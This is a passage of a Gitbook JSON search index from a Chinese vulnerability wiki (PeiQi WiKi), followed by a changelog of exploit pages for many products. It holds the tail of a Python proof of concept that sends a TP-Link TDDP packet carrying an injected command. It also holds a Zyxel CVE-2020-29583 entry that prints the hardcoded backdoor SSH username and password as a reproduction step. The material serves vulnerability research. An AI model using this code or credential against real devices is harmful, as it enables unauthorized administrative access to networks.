Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/Zyxel/":{"url":"PeiQi_Wiki/路由器漏洞/Zyxel/","title":"Zyxel","keywords":"","body":"Zyxel Zyxel 硬编码后门账户漏洞 CVE-2020-29583 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html":{"url":"PeiQi_Wiki/路由器漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html","title":"Zyxel 硬编码后门账户漏洞 CVE-2020-29583","keywords":"","body":"Zyxel 硬编码后门账户漏洞 CVE-2020-29583 漏洞描述 Zyxel固件中发现的后门被称为关键固件漏洞，CVE编号CVE-2020-29583，得分为7.8 CVSS。虽然CVSS评分看似不是很高，但却不可小觑。研究人员表示，这是一个极为严重的漏洞，所有者必须立即更新其系统。因为任何人都可以轻松利用这个漏洞，从DDoS僵尸网络运营商到勒索软件团体和政府资助的黑客。 通过滥用后门账户，网络罪犯可以访问易受攻击的设备并感染内部网络以发起其他攻击。攻击者可以使用管理特权登录设备，并轻易破坏网络设备。 漏洞影响 [!NOTE] Zyxel USG系列 Zyxel ATP系列 Zyxel NCX系列 Zyxel USG FIEX系列 Zyxel VPN系列 FOFA [!NOTE] title=\"USG40\" 等 漏洞复现 使用漏洞扫描脚本找到易受攻击的版本 进行攻击，登录为后门管理员账户 $ ssh zyfwp@xxx.xxx.xxx.xxx Password: PrOw!aN_fXp Router> show users current No: 1 Name: zyfwp Type: admin (...) Router> 参考文章 scan_CVE-2020-29583 Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583） PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"TIME.html":{"url":"TIME.html","title":"TIME","keywords":"","body":"更新时间线记录🦄 2021-1-13 Lanproxy 目录遍历漏洞 CVE-2021-3019 2021-1-11 致远OA ajax.do登录绕过 任意文件上传 CNVD-2021-01627 2021-1-7 QEMU 虚拟机逃逸漏洞 CVE-2020-14364 2021-1-7 Zyxel 硬编码后门账户漏洞 CVE-2020-29583 2021-1-6 Apache Flink 目录遍历漏洞 CVE-2020-17519 2021-1-6 Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518 2021-1-5 F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 2021-1-3 Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 2021-1-3 YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞 2021-1-2 Windows CryptoAPI欺骗漏洞 CVE-2020-0601 2020-12-24 Windows SMB远程代码执行漏洞 CVE-2020-0796 2020-12-18 Typesetter CMS 5-5.1 任意文件上传 2020-12-15 JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 2020-12-12 OpenSSL 心脏滴血漏洞 CVE-2014-0160 2020-12-12 Apache HTTPd 换行解析漏洞 CVE-2017-15715 2020-12-12 Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938 2020-12-11 Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 2020-12-9 Discuz!X 小于3.4 R20191201 后台SQL注入漏洞 2020-12-8 Redis 小于5.0.5 主从复制 RCE 2020-12-9 通达OA v11.x-v11.5任意用户登录 2020-12-7 通达OA v11.2后台任意文件上传漏洞 2020-12-7 通达OA v11.6 任意文件删除&RCE 2020-12-7 通达OA v11.7后台SQL注入 2020-12-6 致远OA A8 htmlofficeservlet RCE漏洞 2020-12-6 致远OA Session泄漏漏洞 2020-12-5 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 2020-12-5 泛微OA e-cology 数据库配置信息泄漏漏洞 2020-12-5 泛微OA WorkflowCenterTreeData接口SQL注入 2020-12-5 泛微云桥 e-Bridge 任意文件读取 2020-11-26 天融信负载均衡TopApp-LB Sql注入漏洞 2020-11-26 通达OA部分漏洞信息整合 2020-11-26 禅道 11.6版本 SQL注入漏洞 2020-11-24 用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923 2020-11-22 禅道 11.6版本 任意文件读取漏洞 2020-11-22 禅道 11.6版本 任意文件写入漏洞 2020-11-21 Apache Kylin 命令注入漏洞 CVE-2020-1956 2020-11-19 Weiphp5.0 前台文件任意读取 CNVD-2020-68596 2020-11-20 Weiphp5.0 任意用户Cookie伪造 2020-11-19 华宜互联CMS默认存在超级管理员漏洞 2020-11-18 Citrix XenMobile 任意文件读取 CVE-2020-8209 2020-11-17 天融信负载均衡TopApp-LB命令执行漏洞 2020-11-17 天融信负载均衡TopApp-LB任意登陆 2020-11-17 锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露 2020-11-14 CISCO ASA设备任意文件读取漏洞 CVE-2020-3452 2020-11-13 深信服EDR远程命令执行 CNVD-2020-46552 2020-11-13 深信服后台任意用户登陆漏洞 2020-11-13 TP-Link SR20 远程命令执行 2020-11-13 宝塔 phpmyadmin未授权访问漏洞 2020-11-12 禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552 2020-11-12 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 2020-11-11 Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 2020-11-11 Nginx越界读取缓存漏洞 CVE-2017-7529 2020-11-11 Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 2020-11-9 Apache Kylin 命令注入漏洞 CVE-2020-13925 2020-11-8 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 2020-11-8 Apache Cocoon XML注入 CVE-2020-11991 2020-11-8 Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437 2020-11-7 Apache Kylin的未授权配置泄露 2020-11-7 Apache Solr JMX服务 RCE CVE-2019-12409 2020-11-7 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 2020-11-7 Apache Solr Velocity模板远程执行 CVE-2019-17558 2020-11-7 Apache Solr XXE 漏洞 CVE-2017-12629 2020-11-7 Apache Solr 远程执行漏洞 CVE-2019-0193 2020-11-7 极致CMS 1.81以下版本 存储型XSS 2020-11-7 极致CMS_1.71_1.7_1.67版本sql注入 2020-11-7 极致CMS_全版本任意文件上传 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "}}